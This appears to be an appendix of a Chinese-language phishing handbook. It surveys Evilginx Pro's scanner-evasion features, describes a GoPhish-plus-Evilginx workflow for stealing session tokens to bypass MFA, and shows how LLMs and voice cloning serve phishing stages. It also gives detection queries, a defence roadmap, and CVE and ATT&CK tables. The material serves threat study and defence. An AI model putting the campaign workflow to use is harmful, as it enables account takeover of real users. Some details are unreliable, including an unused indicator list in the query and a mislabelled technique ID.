Evilginx Pro 是 Kuba Gretzky 花费 2+ 年开发的闭源商业版，代表了 AiTM 钓鱼的前沿能力。

| 版本 | 发布日期 | 关键功能 |
|------|---------|---------|
| Pro 4.0 | 2025-03 | 首发版本，核心代理引擎 |
| Pro 4.2 | 2025-08-14 | 完整代理引擎重写;新反钓鱼检测规避;新 DNS 提供商;诱饵 URL 自定义主机名;改进 GoPhish 集成 |
| Pro 4.3 | 2025-11-26 | 实时事件通知;隧道代理系统全面重构;CSS 金丝雀 token 规避(对抗 Microsoft Token Protection) |

**Evilginx Pro 核心能力矩阵**

| 能力 | 描述 | 防御影响 |
|------|------|---------|
| 反钓鱼检测规避 | 开箱即用，包括对抗 Chrome Enhanced Browser Protection | 传统 URL 过滤失效 |
| 官方 Phishlet 数据库 | 持续测试维护，覆盖主流 SaaS | 攻击者无需自研 phishlet |
| Botguard | 类 Cloudflare Turnstile 反机器人，阻止安全扫描器 | 安全团队难以自动化检测 |
| Evilpuppet | 高级钓鱼能力(Google 相关) | 突破 Google 安全机制 |
| 网站欺骗 | 未授权请求返回伪造正常网站 | 安全扫描器看到正常页面 |
| JS/HTML 混淆 | 自动混淆注入的 JavaScript | 静态分析失效 |
| 通配符 TLS | 自动证书管理 | HTTPS 视觉信任欺骗 |

### C.3 GoPhish 更新 — v0.12.1 + Evilginx 集成

```bash
# GoPhish 最新版本 v0.12.1 (GitHub Releases)
# 关键更新：
# - 安全补丁和依赖更新
# - 性能优化

# Evilginx 集成版 (kgretzky/gophish fork)
# 专为 Evilginx 3.3+ 优化的 GoPhish 分支
docker pull kgretzky/gophish:latest

# 集成工作流：
# 1. Evilginx 创建 lure → 获取钓鱼 URL
# 2. GoPhish 创建邮件模板 → {{.URL}} 指向 Evilginx lure
# 3. GoPhish 发送邮件 → 受害者点击 → Evilginx 代理认证
# 4. Evilginx 捕获 session token → 攻击者获得持久访问
# 优势：GoPhish 的邮件投递能力 + Evilginx 的 MFA 绕过能力
```

### C.4 AI 驱动钓鱼攻击 — 2025-2026 前沿

**AI 在钓鱼攻击链中的角色**

| 攻击阶段 | AI 应用 | 典型技术 | 检测难度 |
|---------|---------|---------|---------|
| 侦察 | 自动化 OSINT 数据聚合 | LLM 分析社交媒体/LinkedIn | 低(与正常OSINT无区别) |
| 模板制作 | 个性化邮件生成 | ChatGPT/Claude 生成语法正确、上下文相关邮件 | 高(与正常邮件几乎无区别) |
| 话术准备 | 角色扮演对话脚本 | LLM 生成 pretext call 脚本 | 高 |
| 语音钓鱼 | AI 语音克隆 | ElevenLabs/Resemble 克隆 CEO/IT 语音 | 极高(人耳难以区分) |
| 落地页 | 动态页面生成 | AI 根据目标品牌自动生成仿冒页面 | 中 |
| 数据处理 | 自动分类/分析 | LLM 分析窃取的凭据/数据 | N/A |

**Trend Micro 2026-05 案例**：
- 俄语独狼威胁行为者运营 5 年 Telegram 频道
- 从 **2025-09 起使用 AI 自动化**内容生成、凭据窃取和加密货币欺诈
- 目标受众：美国观众
- AI 使单人运营者达到此前需要团队的产出规模

**AI 生成钓鱼邮件检测特征**

```python
# AI 生成邮件的检测线索（与人工编写邮件的差异）
ai_phishing_indicators = {
    "语言风格": {
        "过于完美": "AI 生成的邮件通常语法无瑕疵，缺少人类编写时的自然错误",
        "结构化过强": "段落过于整齐，缺乏手写邮件的随意感",
        "通用表达": "使用过于正式或通用的表达方式，缺少组织内部特有用语",
    },
    "元数据": {
        "写作时间异常": "AI 生成邮件的编写时间极短（<30秒）",
        "编辑痕迹缺失": "缺少正常编写时的多次编辑、撤回痕迹",
    },
    "内容特征": {
        "个性化过精确": "AI 基于大量 OSINT 生成的个性化可能过于'完美'",
        "紧迫感模式化": "AI 倾向于使用标准化的紧迫感表达模式",
    }
}
```

### C.5 2025-2026 钓鱼威胁态势统计

**全球钓鱼统计数据**

| 指标 | 2024 基线 | 2025-2026 | 来源 |
|------|----------|-----------|------|
| APWG 季度钓鱼攻击数 | ~500K | 上升趋势，社交媒体+电信行业品牌成新焦点 | APWG Q1 2026 |
| PhaaS 活跃平台数 | ~4 | 7+(新增 SniperDz/Error 524/GTFire 等) | Group-IB |
| 单平台品牌覆盖 | ~50 | 267+(Error 524) | Group-IB |
| 单平台钓鱼域名数 | ~1K | 4,389+(Error 524) | Group-IB |
| AI 辅助钓鱼组织报告率 | N/A | 63% 组织报告 AI 钓鱼攻击增加 | 行业调查 |
| QR 码钓鱼增长 | 基线 | 400%+ 增长 | 多家安全厂商 |

**Group-IB High-Tech Crime Trends 2026 关键发现**：
- 网络犯罪已进入工业化阶段
- 身份和信任成为新的主要攻击面
- 基于边界的防御暴露局限性

**GHOST STADIUM (Group-IB 2026-05)**：
- 中文威胁行为者针对 FIFA 2026 世界杯的钓鱼运营
- 发现 **4,300+ 欺诈域名**冒充 FIFA 官方网络
- 预计造成数十亿美元损失

### C.6 MFA 绕过技术演进 — AiTM 与 Passkey 攻防

**AiTM 攻击演进路线图**

```
第1代 (2022)          第2代 (2023-2024)       第3代 (2025)           第4代 (2025-2026+)
─────────────────────────────────────────────────────────────────────────────────────
Session Cookie 窃取 → Token 拦截+实时重放 → 反 Token Protection → Passkey 注册阶段钓鱼
(Evilginx 2.x)       (Evilginx 3.x)         (Evilginx Pro 4.x)    (研究阶段)
                                           CSS Canary 规避
                                           Botguard 反扫描
```

**微软 Token Protection 对抗措施**

```bash
# Token Protection (Token Binding) — 微软 2025 GA
# 将 session token 绑定到特定设备的 TPM/密钥
# 检查租户是否启用：
# Azure Portal → Entra ID → Security → Authentication Methods

# 检测 Evilginx Pro 活动的关键指标
# 1. 异常的 TLS 指纹 (JA3/JA4)
# 2. 短时间内多用户 session 来自同一 IP
# 3. 登录后立即的异常 API 调用模式

# KQL 检测 — Evilginx AiTM 指标
let evilginx_indicators = dynamic([
    "phishing-test", "secure-login", "update-password", "verify-account"
]);
SigninLogs
| where TimeGenerated > ago(24h)
| where ResultType == 0
| where ClientAppUsed contains "Browser"
| summarize
    LoginCount = count(),
    DistinctUsers = dcount(UserPrincipalName),
    DistinctIPs = dcount(IPAddress),
    Countries = makeset(LocationDetails.countryOrRegion)
    by AppDisplayName
| where LoginCount > 5 and DistinctUsers > 3
| project AppDisplayName, LoginCount, DistinctUsers, DistinctIPs, Countries
```

**Passkey 攻防前沿**

| 方面 | Passkey 优势 | 残余风险 |
|------|-------------|---------|
| 抗 AiTM | 公钥加密，不传输可窃取的 secret | 注册阶段可能被钓鱼(伪造注册页面) |
| 抗重放 | 挑战-响应机制，每个认证唯一 | 设备丢失后的恢复流程可能被利用 |
| 用户体验 | 无需输入密码 | 多设备同步同步产生新攻击面 |
| 部署挑战 | 需要WebAuthn支持 | 降级到密码认证的回退路径 |

### C.7 工具生态更新矩阵

| 工具 | 最新版本 | 类型 | 2025-2026 更新 | 适用场景 |
|------|---------|------|---------------|---------|
| GoPhish | v0.12.1 | 开源 | 安全补丁,Evilginx fork 集成 | 钓鱼演练管理 |
| Evilginx 开源 | v3.3.0 | 开源(BSD-3) | GoPhish 集成,自定义 TLS,反向代理支持 | AiTM MFA 绕过 |
| Evilginx Pro | v4.3 | 商业 | 反检测引擎重写,Botguard,Evilpuppet,CSS canary 规避 | 高级红队 AiTM |
| SET | - | 开源 | 维护模式,功能基本冻结 | 快速钓鱼页面 |
| King Phisher | - | 开源 | 社区维护 | 大规模演练 |
| kgretzky/gophish | - | 开源 fork | Evilginx 3.3+ 官方集成版 | GoPhish+Evilginx 联合作战 |

### C.8 中文社区精华参考

| 来源 | 关键内容 | URL |
|------|---------|-----|
| 奇安信 | 2025 钓鱼攻击态势分析,企业邮件安全防护方案 | https://www.qianxin.com/ |
| FreeBuf | 钓鱼攻防技术实战系列,AiTM 攻击分析 | https://www.freebuf.com/ |
| 安全客 | 钓鱼攻击趋势,PhaaS 平台分析 | https://www.anquanke.com/ |
| 腾讯云安全 | 企业邮件安全,DMARC 部署指南 | https://cloud.tencent.com/product/safety |
| 先知社区 | 钓鱼演练实战,O365 AiTM 攻防 | https://xz.aliyun.com/ |
| 阿里云安全 | 钓鱼检测与防护,SaaS 化安全邮件 | https://www.alibabacloud.com/ |
| 深信服 | 邮件安全网关,钓鱼检测引擎 | https://www.sangfor.com.cn/ |
| 微步在线 | 钓鱼IOC情报,X 威胁情报平台 | https://x.threatbook.com/ |

**中国钓鱼攻击态势要点**：
- Error 524 PhaaS ~30% 基础设施托管在腾讯云/阿里云美国区域
- GHOST STADIUM(中文威胁行为者)针对 FIFA 2026 投放 4,300+ 欺诈域名
- 国内企业邮件安全重点关注：SPF/DKIM/DMARC 部署率仍偏低，尤其是中小企业
- 国产邮件安全网关(深信服/奇安信/启明星辰)逐步集成 AI 钓鱼检测

### C.9 防御升级路线图

```
P0 (立即) — 基础加固
├── 部署 SPF(-all) + DKIM(2048-bit) + DMARC(p=reject)
├── 启用 Microsoft Token Protection (Entra ID)
├── 部署钓鱼报告按钮 (Outlook/Exchange 加载项)
└── 配置邮件网关 AI 检测规则

P1 (30天) — 检测增强
├── 部署 JA4 TLS 指纹检测 (识别 Evilginx 代理)
├── 配置 Sigma 规则检测异常登录模式
├── 启用 CAE (Continuous Access Evaluation)
└── 建立钓鱼演练基线度量

P2 (90天) — 纵深防御
├── 推广 FIDO2/Passkey (优先高价值账户)
├── 部署条件访问策略 (合规设备+位置+风险评分)
├── 实施季度钓鱼演练 + 安全意识培训闭环
└── 建立 PhaaS 威胁情报监控 (域名/品牌冒充)

P3 (持续) — 持续改进
├── 监控 Evilginx Pro 新版本和 phishlet 更新
├── 跟踪 AI 生成钓鱼邮件的检测技术演进
├── 更新 QR 码钓鱼防护策略
└── 参与行业钓鱼威胁情报共享 (APWG/ISAC)
```

### C.10 2025-2026 钓鱼相关 CVE 速查

| CVE | 产品 | CVSS | 描述 | 利用状态 |
|-----|------|------|------|---------|
| CVE-2025-8088 | WinRAR | 7.8 | 俄罗斯对齐攻击利用，针对乌克兰组织钓鱼投递 | 野外利用 |
| CVE-2025-24813 | Apache Tomcat | 9.8 | Partial PUT + 反序列化 RCE，可被钓鱼附件利用 | 野外利用 |
| CVE-2025-55241 | Entra ID | 10.0 | 跨租户 Actor Token 冒充，钓鱼后横向移动关键 | 已修复 |
| CVE-2025-29927 | Next.js | 7.5 | x-middleware-subrequest 授权绕过，钓鱼页面后端可能受影响 | 已修复 |
| CVE-2025-54136 | LangChain MCP | N/A | MCP 工具投毒，可被用于 AI 辅助钓鱼基础设施 | 概念验证 |

> 注：钓鱼攻击本身通常不直接利用 CVE，而是利用社会工程学。上述 CVE 为钓鱼攻击链中可能涉及的下游利用。

---

## MITRE ATT&CK 映射 (更新版)

| Tactic | Technique | ID | 本手册覆盖 |
|--------|-----------|-----|-----------|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | 鱼叉式钓鱼模板制作 |
| Initial Access | Phishing: Spearphishing Link | T1566.002 | GoPhish 链接钓鱼 |
| Initial Access | Phishing: Spearphishing via Service | T1566.003 | 第三方服务钓鱼,GTFire |
| Initial Access | Phishing: Spearphishing Voice (Vishing) | T1566.004 | 预设话术电话,AI 语音克隆 |
| Credential Access | Phishing for Credentials | T1189 | 凭据收集页面 |
| Credential Access | Adversary-in-the-Middle | T1557 | Evilginx2/Pro AiTM |
| Credential Access | Web Session Cookie | T1539 | Session token 劫持 |
| Defense Evasion | Obfuscated Files | T1027 | URL/载荷编码,JS 混淆 |
| Defense Evasion | Masquerading | T1036 | 品牌仿冒,发件人伪装 |
| Discovery | Email Collection | T1114 | 邮件转发规则 |
| Persistence | Office Application Startup | T1137 | 邮件规则持久化 |
| Collection | Data from Information Repositories | T1213 | 邮件数据收集 |
